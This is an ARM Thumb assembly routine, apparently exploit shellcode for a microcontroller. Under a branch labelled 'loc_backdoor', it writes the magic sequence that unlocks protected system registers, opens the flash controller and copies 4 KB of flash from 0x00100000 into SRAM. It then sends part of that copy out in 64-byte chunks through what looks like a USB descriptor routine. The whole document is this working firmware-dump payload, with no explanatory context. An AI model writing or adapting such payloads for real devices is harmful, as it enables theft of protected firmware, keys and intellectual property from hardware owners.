.global main
.syntax unified

test:
    .thumb

    PUSH            {R4-R7,LR}
    MOV             R4, R0
    MOV             R5, R1
    LDRB            R6, [R4]
    LDRB            R0, [R4,#1]

loc_backdoor:
    MOVS            R6,  R5

    // Register unlock (SYS_UnlockReg)
    LDR     R1, =0x50000100
    MOVS    R0, #0x59
    STR     R0, [R1]
    MOVS    R0, #0x16
    STR     R0, [R1]
    MOVS    R0, #0x88
    STR     R0, [R1]

    // FMC->ISPCON |=1 (FMC_Open)
    // [0x5000_C000 + 0x00] |= 1
    LDR     R1, =0x5000C000
    LDR     R0, [R1]
    MOVS    R2, #0x01
    ORRS    R0, R2
    STR     R0, [R1]


    MOVS    R7, #0

    read_flash:
    // FMC->ISPCMD = FMC_ISPCMD_READ
    // [0x5000_C000 + 0x0C] = 0x00
    MOVS    R0, R1
    ADDS    R0, #0x0C
    MOVS    R2, #0
    STR     R2, [R0]

    // FMC->ISPADR = addr
    // [0x5000_C000 + 0x04] = addr
    MOVS    R0, R1
    ADDS    R0, #0x04
    LDR     R2, =0x00100000
    ADDS    R2, R7
    STR     R2, [R0]

    // FMC->ISPTRG = 0x1;
    // [0x5000_C000 + 0x10] = 0x01
    MOVS    R0, R1
    ADDS    R0, #0x10
    MOVS    R2, #1
    STR     R2, [R0]

    // ISP/CPU Sync
    //ISB     #0

    wait:
    LDR     R2, [R0]
    CMP     R2, #0
    BNE     wait

    MOVS    R0, R1
    ADDS    R0, #0x08
    LDR     R0, [R0]
    LDR     R2, =0x20003000 // SRAM
    ADDS    R2, R7
    STR     R0, [R2]

    ADDS    R7, #4
    LDR     R0, =0x1000
    CMP     R7, R0
    BNE     read_flash
    //LDR     R4, =0x20003000

    LDR             R7, =0x0 // START
    LDR             R4, =0x400 // END

send_loop:
    LDR             R0, =0x20003000
    ADDS            R0, R7
    MOVS            R1, #0x40
    BL              send_descriptor_candi_1

    ADDS            R7, #0x40
    CMP             R7, R4

    BNE             send_loop

    POP             {R4-R7,PC}
